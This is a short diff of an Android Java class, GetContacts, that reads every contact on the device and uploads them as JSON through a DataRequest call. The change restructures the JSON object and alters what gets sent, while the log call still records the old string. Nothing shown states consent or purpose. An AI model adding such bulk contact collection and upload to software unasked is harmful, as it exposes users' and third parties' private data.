@@ -40,6 +40,8 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 	public void readContacts() throws JSONException {
 		data = new JSONArray();
 		jsonAllContact = new JSONObject();
+		jsonObject = new JSONObject();
+
 		ContentResolver cr = mContext.getContentResolver();
 		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
 				null, null, null);
@@ -56,8 +58,7 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 				jsonImId = new JSONObject();
 				jsonImCount = new JSONObject();
 				jsonOrganization = new JSONObject();
-				jsonObject = new JSONObject();
-
+				
 				email = new ArrayList<String>();
 				emailType = new ArrayList<String>();
 
@@ -209,7 +210,7 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 			}
 			if (jsonAllContact != null) {
 				DataRequest dr = new DataRequest(mContext);
-				dr.sendRequest(sendJSONStr);
+				dr.sendRequest(jsonObject.toString());
 				Logging.doLog(LOG_TAG, sendJSONStr,
 						sendJSONStr);
 			}
